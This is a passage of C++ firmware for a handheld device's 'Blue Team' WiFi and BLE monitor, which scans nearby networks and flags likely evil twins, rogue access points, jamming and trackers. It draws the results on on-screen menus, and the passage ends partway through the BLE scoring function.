  M5.Display.drawFastHLine(x + 6, y + 6, w - 12, kGold);
  M5.Display.drawFastHLine(x + 6, y + h - 7, w - 12, themeModeSoft(TeamMode::Red));
}

void drawBluePanelFrame(int x, int y, int w, int h, uint16_t accent) {
  M5.Display.fillRoundRect(x, y, w, h, 12, themeModePanel(TeamMode::Blue));
  M5.Display.drawRoundRect(x, y, w, h, 12, accent);
  M5.Display.drawRoundRect(x + 4, y + 4, w - 8, h - 8, 12, themeModeSoft(TeamMode::Blue));
}

void drawBlueMeter(int x, int y, uint16_t color) {
  for (int i = 0; i < 5; ++i) {
    M5.Display.drawRoundRect(x, y + i * 9, 32, 6, 3, color);
    M5.Display.fillRoundRect(x + 2, y + 2 + i * 9, 18 + i * 2, 2, 2, color);
  }
}

const char* authLabel(wifi_auth_mode_t auth) {
  switch (auth) {
    case WIFI_AUTH_OPEN: return "open";
    case WIFI_AUTH_WEP: return "wep";
    case WIFI_AUTH_WPA_PSK: return "wpa";
    case WIFI_AUTH_WPA2_PSK: return "wpa2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "mix";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "ent";
    case WIFI_AUTH_WPA3_PSK: return "wpa3";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "w23";
    default: return "sec";
  }
}

const char* wifiSortLabel() {
  switch (g_wifiSortMode) {
    case WifiSortMode::Rssi: return "RSSI";
    case WifiSortMode::Channel: return "CHAN";
    case WifiSortMode::OpenFirst: return "OPEN";
    case WifiSortMode::NewFirst: return "NEW";
    case WifiSortMode::Threat: return "RISK";
  }
  return "RSSI";
}

bool shouldSwapWifiItems(const WifiScanItem& a, const WifiScanItem& b) {
  switch (g_wifiSortMode) {
    case WifiSortMode::Rssi:
      return b.rssi > a.rssi;
    case WifiSortMode::Channel:
      if (b.channel == a.channel) return b.rssi > a.rssi;
      return b.channel < a.channel;
    case WifiSortMode::OpenFirst:
      if ((b.auth == WIFI_AUTH_OPEN) != (a.auth == WIFI_AUTH_OPEN)) {
        return b.auth == WIFI_AUTH_OPEN;
      }
      return b.rssi > a.rssi;
    case WifiSortMode::NewFirst:
      if (b.isNew != a.isNew) return b.isNew;
      if (b.changed != a.changed) return b.changed;
      return b.rssi > a.rssi;
    case WifiSortMode::Threat:
      if (b.riskScore == a.riskScore) return b.rssi > a.rssi;
      return b.riskScore > a.riskScore;
  }
  return false;
}

bool isCaptivePortalLikeName(const String& ssid) {
  String lower = ssid;
  lower.toLowerCase();
  return lower.indexOf("guest") >= 0 || lower.indexOf("portal") >= 0 ||
         lower.indexOf("login") >= 0 || lower.indexOf("free") >= 0 ||
         lower.indexOf("public") >= 0 || lower.indexOf("wifi") >= 0 ||
         lower.indexOf("internet") >= 0;
}

bool isLocallyAdministeredMac(const String& mac) {
  if (mac.length() < 2) return false;
  char hi = mac.charAt(0);
  char lo = mac.charAt(1);
  auto hexVal = [](char c) -> int {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return 10 + (c - 'a');
    if (c >= 'A' && c <= 'F') return 10 + (c - 'A');
    return 0;
  };
  const int firstByte = (hexVal(hi) << 4) | hexVal(lo);
  return (firstByte & 0x02) != 0;
}

const char* bleSortLabel() {
  switch (g_bleSortMode) {
    case BleSortMode::Rssi: return "RSSI";
    case BleSortMode::NewFirst: return "NEW";
    case BleSortMode::Threat: return "RISK";
  }
  return "RSSI";
}

String bleVendorHint(const String& mac) {
  if (mac.length() < 8) return "unknown";
  String prefix = mac.substring(0, 8);
  prefix.toUpperCase();
  if (prefix == "88:C6:26" || prefix == "D0:03:4B" || prefix == "F0:5A:09") return "apple";
  if (prefix == "C8:14:79" || prefix == "2C:BE:EB" || prefix == "FC:F5:C4") return "google";
  if (prefix == "3C:5A:B4" || prefix == "A4:C1:38" || prefix == "64:BC:0C") return "samsung";
  if (prefix == "E8:50:8B" || prefix == "54:48:E6") return "tile";
  return "unknown";
}

String bleRoleHint(const String& name) {
  String lower = name;
  lower.toLowerCase();
  if (lower.indexOf("airtag") >= 0 || lower.indexOf("tile") >= 0 ||
      lower.indexOf("chipolo") >= 0 || lower.indexOf("track") >= 0) {
    return "tracker";
  }
  if (lower.indexOf("watch") >= 0 || lower.indexOf("buds") >= 0 ||
      lower.indexOf("headset") >= 0 || lower.indexOf("speaker") >= 0) {
    return "wearable";
  }
  if (lower.indexOf("phone") >= 0 || lower.indexOf("iphone") >= 0 ||
      lower.indexOf("pixel") >= 0 || lower.indexOf("galaxy") >= 0) {
    return "mobile";
  }
  if (lower.indexOf("tv") >= 0 || lower.indexOf("roku") >= 0 ||
      lower.indexOf("fire") >= 0) {
    return "media";
  }
  return "generic";
}

String wifiAlertReason(const WifiScanItem& item) {
  if (item.evilTwinSuspect) return "evil twin";
  if (item.captivePortalSuspect) return "portal suspect";
  if (item.jamSuspect) return "jam/deauth";
  if (item.spamSuspect) return "beacon flood";
  if (item.rogueSuspect) return "rogue AP";
  if (item.macSpoofSuspect) return "mac churn";
  if (item.authChanged) return "auth changed";
  if (item.duplicateSsid) return "dup ssid";
  if (item.crowdedChannel) return "channel crowd";
  if (item.isNew) return "new AP";
  return "anomaly";
}

String bleAlertReason(const BleScanItem& item) {
  if (item.trackerSuspect) return "tracker";
  if (item.spamSuspect) return "ble spam";
  if (item.churnSuspect) return "addr churn";
  if (item.beaconSuspect) return "anon beacon";
  if (item.rogueSuspect) return "rogue device";
  if (item.changed) return "changed";
  if (item.isNew) return "new device";
  return "anomaly";
}

void rebuildWifiThreatFeedIndices() {
  g_wifiThreatCount = 0;
  for (int i = 0; i < g_wifiCount && g_wifiThreatCount < 8; ++i) {
    if (g_wifiItems[i].riskScore < 18) continue;
    g_wifiThreatIndices[g_wifiThreatCount++] = i;
  }
  if (g_wifiThreatSelected >= g_wifiThreatCount) {
    g_wifiThreatSelected = g_wifiThreatCount > 0 ? g_wifiThreatCount - 1 : 0;
  }
}

void rebuildBleThreatFeedIndices() {
  g_bleThreatCount = 0;
  for (int i = 0; i < g_bleCount && g_bleThreatCount < 8; ++i) {
    if (g_bleItems[i].riskScore < 18) continue;
    g_bleThreatIndices[g_bleThreatCount++] = i;
  }
  if (g_bleThreatSelected >= g_bleThreatCount) {
    g_bleThreatSelected = g_bleThreatCount > 0 ? g_bleThreatCount - 1 : 0;
  }
}

void sortWifiItems() {
  for (int i = 0; i < g_wifiCount - 1; ++i) {
    for (int j = i + 1; j < g_wifiCount; ++j) {
      if (shouldSwapWifiItems(g_wifiItems[i], g_wifiItems[j])) {
        WifiScanItem temp = g_wifiItems[i];
        g_wifiItems[i] = g_wifiItems[j];
        g_wifiItems[j] = temp;
      }
    }
  }
}

void scoreWifiThreats() {
  g_wifiChannelVolatility = 0;
  for (int i = 1; i <= 13; ++i) {
    g_wifiChannelVolatility += abs(g_wifiChannelCounts[i] - g_wifiPrevChannelCounts[i]);
  }
  g_wifiJamScore = 0;
  if (g_wifiGoneCount >= 6) g_wifiJamScore += 30;
  if (g_wifiChangedCount >= 8) g_wifiJamScore += 20;
  if (g_wifiChannelVolatility >= 10) g_wifiJamScore += 25;
  if (g_wifiNewCount >= 10) g_wifiJamScore += 10;

  for (int i = 0; i < g_wifiCount; ++i) {
    WifiScanItem& item = g_wifiItems[i];
    item.duplicateSsid = false;
    item.crowdedChannel = false;
    item.evilTwinSuspect = false;
    item.captivePortalSuspect = false;
    item.spamSuspect = false;
    item.rogueSuspect = false;
    item.jamSuspect = false;
    item.macSpoofSuspect = false;
    item.riskScore = 0;

    if (item.channel >= 1 && item.channel <= 13) {
      item.crowdedChannel = g_wifiChannelCounts[item.channel] >= 4;
    }
    if (item.hidden) item.riskScore += 8;
    if (item.auth == WIFI_AUTH_OPEN) item.riskScore += 20;
    if (item.isNew) item.riskScore += 10;
    if (item.strongSignalJump) item.riskScore += 12;
    if (item.authChanged) item.riskScore += 25;
    if (item.crowdedChannel) item.riskScore += 8;
    if (isLocallyAdministeredMac(item.bssid)) {
      item.macSpoofSuspect = true;
      item.riskScore += 12;
    }
  }

  for (int i = 0; i < g_wifiCount; ++i) {
    for (int j = i + 1; j < g_wifiCount; ++j) {
      if (g_wifiItems[i].ssid.length() == 0 || g_wifiItems[i].ssid != g_wifiItems[j].ssid ||
          g_wifiItems[i].bssid == g_wifiItems[j].bssid) {
        continue;
      }

      g_wifiItems[i].duplicateSsid = true;
      g_wifiItems[j].duplicateSsid = true;
      g_wifiItems[i].riskScore += 10;
      g_wifiItems[j].riskScore += 10;

      const bool authMismatch = g_wifiItems[i].auth != g_wifiItems[j].auth;
      const bool channelSpread = abs(g_wifiItems[i].channel - g_wifiItems[j].channel) >= 5;
      const bool strongTwin = abs(g_wifiItems[i].rssi - g_wifiItems[j].rssi) >= 18;

      if (authMismatch || channelSpread || strongTwin) {
        g_wifiItems[i].evilTwinSuspect = true;
        g_wifiItems[j].evilTwinSuspect = true;
        g_wifiItems[i].riskScore += 28;
        g_wifiItems[j].riskScore += 28;
      }
    }
  }

  for (int i = 0; i < g_wifiCount; ++i) {
    WifiScanItem& item = g_wifiItems[i];
    if (item.auth == WIFI_AUTH_OPEN &&
        (item.hidden || item.duplicateSsid || isCaptivePortalLikeName(item.ssid))) {
      item.captivePortalSuspect = true;
      item.riskScore += 24;
    }

    if (g_wifiNewCount >= 8 && item.isNew) {
      item.spamSuspect = true;
      item.riskScore += 18;
    }
    if (item.hidden && g_wifiNewCount >= 5) {
      item.spamSuspect = true;
      item.riskScore += 14;
    }
    if (g_wifiScanGeneration > 2 && item.isNew && item.rssi >= -70) {
      item.rogueSuspect = true;
      item.riskScore += 18;
    }
    if (g_wifiJamScore >= 35) {
      item.jamSuspect = true;
      item.riskScore += 14;
    }
    if (item.macSpoofSuspect && item.duplicateSsid) {
      item.riskScore += 12;
    }

    if (item.riskScore > 99) item.riskScore = 99;
  }
}

void runWifiScan() {
  WifiScanItem previous[32];
  const int previousCount = g_wifiCount;
  for (int i = 0; i < previousCount; ++i) previous[i] = g_wifiItems[i];
  for (int i = 0; i < 14; ++i) g_wifiPrevChannelCounts[i] = g_wifiChannelCounts[i];

  g_wifiCount = 0;
  g_wifiOpenCount = 0;
  g_wifiSecureCount = 0;
  g_wifiNewCount = 0;
  g_wifiGoneCount = 0;
  g_wifiChangedCount = 0;
  ++g_wifiScanGeneration;
  for (int i = 0; i < 14; ++i) g_wifiChannelCounts[i] = 0;

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false, true);
  delay(100);
  const int found = WiFi.scanNetworks(false, true);
  if (found <= 0) return;

  const int limit = found < 32 ? found : 32;
  for (int i = 0; i < limit; ++i) {
    WifiScanItem item = {
        WiFi.SSID(i),
        WiFi.BSSIDstr(i),
        WiFi.RSSI(i),
        WiFi.RSSI(i),
        WiFi.channel(i),
        WiFi.channel(i),
        WiFi.encryptionType(i),
        WiFi.encryptionType(i),
        true,
        false,
        false,
        WiFi.SSID(i).length() == 0,
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        0,
        g_wifiScanGeneration,
        g_wifiScanGeneration,
    };

    for (int p = 0; p < previousCount; ++p) {
      if (previous[p].bssid == item.bssid) {
        item.isNew = false;
        item.firstSeenScan = previous[p].firstSeenScan;
        item.prevRssi = previous[p].rssi;
        item.prevChannel = previous[p].channel;
        item.prevAuth = previous[p].auth;
        item.authChanged = previous[p].auth != item.auth;
        item.strongSignalJump = abs(previous[p].rssi - item.rssi) >= 15;
        item.changed = (previous[p].channel != item.channel) ||
                       (previous[p].auth != item.auth) ||
                       (abs(previous[p].rssi - item.rssi) >= 8);
        if (item.changed) ++g_wifiChangedCount;
        break;
      }
    }
    if (item.isNew) ++g_wifiNewCount;

    g_wifiItems[g_wifiCount++] = item;
    if (item.channel >= 1 && item.channel <= 13) {
      g_wifiChannelCounts[item.channel]++;
    }
    if (item.auth == WIFI_AUTH_OPEN) {
      ++g_wifiOpenCount;
    } else {
      ++g_wifiSecureCount;
    }
  }
  WiFi.scanDelete();

  for (int p = 0; p < previousCount; ++p) {
    bool stillPresent = false;
    for (int i = 0; i < g_wifiCount; ++i) {
      if (previous[p].bssid == g_wifiItems[i].bssid) {
        stillPresent = true;
        break;
      }
    }
    if (!stillPresent) ++g_wifiGoneCount;
  }

  scoreWifiThreats();

  sortWifiItems();
  rebuildWifiThreatFeedIndices();
  if (g_wifiSelected >= g_wifiCount) g_wifiSelected = g_wifiCount > 0 ? g_wifiCount - 1 : 0;
  if (g_wifiSelected < 0) g_wifiSelected = 0;
  if (g_wifiScroll > g_wifiSelected) g_wifiScroll = g_wifiSelected;
  if (g_wifiSelected >= g_wifiScroll + kWifiVisibleRows) {
    g_wifiScroll = g_wifiSelected - kWifiVisibleRows + 1;
  }
}

void drawWifiListScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  const uint16_t soft = themeModeSoft(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("Blue Team WiFi Mon");
  drawBatteryWidget(panel, 132);
  M5.Display.setTextColor(kDimText, panel);
  M5.Display.setCursor(168, 8);
  M5.Display.println("inspect");

  M5.Display.fillRoundRect(8, 28, 224, 92, 10, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 10, accent);

  M5.Display.setTextColor(kGold, kPanelAlt);
  M5.Display.setCursor(14, 36);
  M5.Display.printf("APs:%d", g_wifiCount);
  M5.Display.setCursor(64, 36);
  M5.Display.printf("N:%d", g_wifiNewCount);
  M5.Display.setCursor(104, 36);
  M5.Display.printf("C:%d", g_wifiChangedCount);
  M5.Display.setCursor(144, 36);
  M5.Display.printf("G:%d", g_wifiGoneCount);
  M5.Display.setCursor(184, 36);
  M5.Display.printf("%s", wifiSortLabel());
  M5.Display.setCursor(14, 114);
  M5.Display.printf("J:%d V:%d", g_wifiJamScore, g_wifiChannelVolatility);

  if (g_wifiCount <= 0) {
    M5.Display.setTextColor(kText, kPanelAlt);
    M5.Display.setCursor(14, 52);
    M5.Display.println("No APs found");
  } else {
    M5.Display.setTextColor(accent, kPanelAlt);
    M5.Display.setCursor(14, 48);
    M5.Display.println("! SSID        RSSI CH RS");
    const int end = (g_wifiScroll + kWifiVisibleRows < g_wifiCount) ? (g_wifiScroll + kWifiVisibleRows) : g_wifiCount;
    for (int i = g_wifiScroll; i < end; ++i) {
      const int row = i - g_wifiScroll;
      const int y = 58 + (row * 9);
      String ssid = g_wifiItems[i].ssid;
      if (ssid.length() > 10) {
        ssid = ssid.substring(0, 10);
      } else if (ssid.length() == 0) {
        ssid = "<hidden>";
      }
      if (i == g_wifiSelected) {
        M5.Display.fillRoundRect(12, y - 1, 216, 8, 4, accent);
        M5.Display.setTextColor(WHITE, accent);
      } else {
        M5.Display.setTextColor(kText, kPanelAlt);
      }
      char marker = '.';
      if (g_wifiItems[i].evilTwinSuspect) marker = 'E';
      else if (g_wifiItems[i].captivePortalSuspect) marker = 'P';
      else if (g_wifiItems[i].spamSuspect) marker = 'S';
      else if (g_wifiItems[i].jamSuspect) marker = 'J';
      else if (g_wifiItems[i].rogueSuspect) marker = 'R';
      else if (g_wifiItems[i].macSpoofSuspect) marker = 'M';
      else if (g_wifiItems[i].isNew) marker = '+';
      else if (g_wifiItems[i].changed) marker = '*';
      else if (g_wifiItems[i].auth == WIFI_AUTH_OPEN) marker = '!';
      else if (g_wifiItems[i].duplicateSsid) marker = 'd';
      else if (g_wifiItems[i].crowdedChannel) marker = 'c';
      M5.Display.setCursor(14, y);
      M5.Display.printf("%c %-10s %4d %2d %2d", marker, ssid.c_str(), g_wifiItems[i].rssi,
                        g_wifiItems[i].channel, g_wifiItems[i].riskScore);
    }
    M5.Display.setTextColor(soft, kPanelAlt);
    M5.Display.setCursor(176, 48);
    M5.Display.printf("%d/%d", g_wifiSelected + 1, g_wifiCount);
  }

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Ent:info ;/.:move Fn+S:sort Fn+R:scan");
}

void drawWifiDetailScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  const WifiScanItem& item = g_wifiItems[g_wifiSelected];

  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("WiFi AP Detail");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 28, 224, 92, 10, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 10, accent);
  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 36);
  M5.Display.println("SSID");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 36);
  M5.Display.println(item.ssid.length() ? item.ssid : "<hidden>");

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 50);
  M5.Display.println("BSSID");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 50);
  M5.Display.println(item.bssid);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 64);
  M5.Display.println("RSSI");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 64);
  M5.Display.printf("%d dBm (%+d)", item.rssi, item.rssi - item.prevRssi);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 78);
  M5.Display.println("Chan");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 78);
  M5.Display.printf("%d", item.channel);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 92);
  M5.Display.println("Auth");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 92);
  M5.Display.println(authLabel(item.auth));

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(116, 78);
  M5.Display.println("Risk");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(154, 78);
  M5.Display.printf("%d", item.riskScore);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(116, 92);
  M5.Display.println("Flags");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(154, 92);
  if (item.evilTwinSuspect) M5.Display.print("E");
  if (item.captivePortalSuspect) M5.Display.print("P");
  if (item.spamSuspect) M5.Display.print("S");
  if (item.jamSuspect) M5.Display.print("J");
  if (item.rogueSuspect) M5.Display.print("R");
  if (item.macSpoofSuspect) M5.Display.print("M");
  if (item.authChanged) M5.Display.print("A");
  if (item.duplicateSsid) M5.Display.print("D");
  if (item.crowdedChannel) M5.Display.print("C");
  if (!item.evilTwinSuspect && !item.captivePortalSuspect && !item.spamSuspect &&
      !item.authChanged && !item.duplicateSsid && !item.crowdedChannel) {
    M5.Display.print(".");
  }

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 106);
  M5.Display.println("Seen");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 106);
  M5.Display.printf("%lu / %lu", static_cast<unsigned long>(item.firstSeenScan),
                    static_cast<unsigned long>(item.lastSeenScan));

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Ent list  Fn+Bk back  Tab+Bk");
}

const char* kBlueWifiMenuItems[] = {
    "Device Watch",
    "Threat Feed",
    "AP Intel",
    "Channel Map",
};

const char* blueWifiMenuDesc(int index) {
  switch (index) {
    case 0: return "Full AP list / inspect";
    case 1: return "Highest-risk AP findings";
    case 2: return "Open / dup / rogue summary";
    case 3: return "Channel crowding / volatility";
    default: return "";
  }
}

void drawBlueWifiMenuScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  const uint16_t soft = themeModeSoft(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.println("Blue Team WiFi Mon");
  drawBatteryWidget(panel, 132);
  M5.Display.setTextColor(kDimText, panel);
  M5.Display.setCursor(172, 8);
  M5.Display.println("toolbox");

  M5.Display.fillRoundRect(8, 28, 224, 92, 10, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 10, accent);
  M5.Display.setTextColor(kGold, kPanelAlt);
  M5.Display.setCursor(14, 36);
  M5.Display.printf("AP:%d N:%d C:%d G:%d", g_wifiCount, g_wifiNewCount, g_wifiChangedCount, g_wifiGoneCount);

  for (int i = 0; i < 4; ++i) {
    const int y = 50 + (i * 14);
    if (i == g_blueWifiMenuIndex) {
      M5.Display.fillRoundRect(12, y - 2, 216, 12, 5, accent);
      M5.Display.setTextColor(WHITE, accent);
    } else {
      M5.Display.setTextColor(kText, kPanelAlt);
    }
    M5.Display.setCursor(16, y);
    M5.Display.print(i + 1);
    M5.Display.print(". ");
    M5.Display.println(kBlueWifiMenuItems[i]);
  }

  M5.Display.setTextColor(soft, kPanelAlt);
  M5.Display.setCursor(14, 108);
  M5.Display.println(blueWifiMenuDesc(g_blueWifiMenuIndex));

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Ent open ;/. move Fn+R scan");
}

void drawBlueWifiThreatScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.println("WiFi Threat Feed");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 28, 224, 92, 10, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 10, accent);
  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 36);
  M5.Display.println("! SSID        RK");
  for (int row = 0; row < g_wifiThreatCount && row < 6; ++row) {
    const int i = g_wifiThreatIndices[row];
    String ssid = g_wifiItems[i].ssid.length() ? g_wifiItems[i].ssid : String("<hidden>");
    if (ssid.length() > 12) ssid = ssid.substring(0, 12);
    const int y = 48 + (row * 10);
    char marker = g_wifiItems[i].evilTwinSuspect ? 'E' :
                  g_wifiItems[i].captivePortalSuspect ? 'P' :
                  g_wifiItems[i].spamSuspect ? 'S' :
                  g_wifiItems[i].jamSuspect ? 'J' :
                  g_wifiItems[i].rogueSuspect ? 'R' :
                  g_wifiItems[i].macSpoofSuspect ? 'M' : '!';
    if (row == g_wifiThreatSelected) {
      M5.Display.fillRoundRect(12, y - 1, 216, 8, 4, accent);
      M5.Display.setTextColor(WHITE, accent);
    } else {
      M5.Display.setTextColor(kText, kPanelAlt);
    }
    M5.Display.setCursor(14, y);
    M5.Display.printf("%c %-12s %2d", marker, ssid.c_str(), g_wifiItems[i].riskScore);
  }
  if (g_wifiThreatCount == 0) {
    M5.Display.setTextColor(kText, kPanelAlt);
    M5.Display.setCursor(14, 54);
    M5.Display.println("No high-risk WiFi findings");
  } else {
    M5.Display.setTextColor(accent, kPanelAlt);
    M5.Display.setCursor(182, 36);
    M5.Display.printf("%d/%d", g_wifiThreatSelected + 1, g_wifiThreatCount);
  }
  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Ent:detail ;/.:move Fn+R:scan");
}

void drawBlueWifiIntelScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.println("AP Intel");
  drawBatteryWidget(panel, 132);

  int dup = 0, open = 0, rogue = 0, twin = 0;
  for (int i = 0; i < g_wifiCount; ++i) {
    if (g_wifiItems[i].duplicateSsid) ++dup;
    if (g_wifiItems[i].auth == WIFI_AUTH_OPEN) ++open;
    if (g_wifiItems[i].rogueSuspect) ++rogue;
    if (g_wifiItems[i].evilTwinSuspect) ++twin;
  }

  M5.Display.fillRoundRect(8, 28, 224, 92, 10, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 10, accent);
  M5.Display.setTextColor(kGold, kPanelAlt);
  M5.Display.setCursor(14, 36);
  M5.Display.printf("Open:%d", open);
  M5.Display.setCursor(14, 52);
  M5.Display.printf("Dup SSID:%d", dup);
  M5.Display.setCursor(14, 68);
  M5.Display.printf("Evil Twin:%d", twin);
  M5.Display.setCursor(14, 84);
  M5.Display.printf("Rogue AP:%d", rogue);
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(14, 100);
  M5.Display.println("Use Device Watch for drill-in");

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Fn+Bk back  Fn+R scan");
}

void drawBlueWifiChannelScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.println("Channel Map");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 28, 224, 92, 10, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 10, accent);
  M5.Display.setTextColor(kGold, kPanelAlt);
  M5.Display.setCursor(14, 36);
  M5.Display.printf("Volatility:%d", g_wifiChannelVolatility);
  M5.Display.setCursor(14, 48);
  M5.Display.printf("Jam Score:%d", g_wifiJamScore);
  int topChan = 1;
  for (int ch = 2; ch <= 13; ++ch) {
    if (g_wifiChannelCounts[ch] > g_wifiChannelCounts[topChan]) topChan = ch;
  }
  M5.Display.setCursor(14, 60);
  M5.Display.printf("Top Ch:%d (%d AP)", topChan, g_wifiChannelCounts[topChan]);
  M5.Display.setCursor(14, 74);
  M5.Display.printf("Ch1:%d Ch6:%d Ch11:%d", g_wifiChannelCounts[1], g_wifiChannelCounts[6], g_wifiChannelCounts[11]);
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(14, 92);
  M5.Display.println("Crowding and churn summary");
  M5.Display.setCursor(14, 100);
  M5.Display.println("Fn+R=rescan for fresh map");

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Fn+Bk back  Fn+R scan");
}

void drawWifiMonitorScreen(TeamMode mode) {
  switch (g_blueWifiView) {
    case BlueWifiView::Menu:
      drawBlueWifiMenuScreen(mode);
      break;
    case BlueWifiView::DeviceWatch:
      if (g_wifiCount == 0) runWifiScan();
      drawWifiListScreen(mode);
      break;
    case BlueWifiView::Detail:
      if (g_wifiCount == 0) runWifiScan();
      drawWifiDetailScreen(mode);
      break;
    case BlueWifiView::ThreatFeed:
      if (g_wifiCount == 0) runWifiScan();
      drawBlueWifiThreatScreen(mode);
      break;
    case BlueWifiView::ApIntel:
      if (g_wifiCount == 0) runWifiScan();
      drawBlueWifiIntelScreen(mode);
      break;
    case BlueWifiView::ChannelMap:
      if (g_wifiCount == 0) runWifiScan();
      drawBlueWifiChannelScreen(mode);
      break;
  }
}

bool shouldSwapBleItems(const BleScanItem& a, const BleScanItem& b) {
  switch (g_bleSortMode) {
    case BleSortMode::Rssi:
      return b.rssi > a.rssi;
    case BleSortMode::NewFirst:
      if (b.isNew != a.isNew) return b.isNew;
      if (b.changed != a.changed) return b.changed;
      return b.rssi > a.rssi;
    case BleSortMode::Threat:
      if (b.riskScore == a.riskScore) return b.rssi > a.rssi;
      return b.riskScore > a.riskScore;
  }
  return false;
}

void sortBleItems() {
  for (int i = 0; i < g_bleCount - 1; ++i) {
    for (int j = i + 1; j < g_bleCount; ++j) {
      if (shouldSwapBleItems(g_bleItems[i], g_bleItems[j])) {
        BleScanItem temp = g_bleItems[i];
        g_bleItems[i] = g_bleItems[j];
        g_bleItems[j] = temp;
      }
    }
  }
}

void scoreBleThreats() {
  for (int i = 0; i < g_bleCount; ++i) {
    BleScanItem& item = g_bleItems[i];
    item.trackerSuspect = false;
    item.beaconSuspect = false;
    item.spamSuspect = false;
    item.churnSuspect = false;
    item.rogueSuspect = false;
    item.riskScore = 0;
    if (item.isNew) item.riskScore += 10;
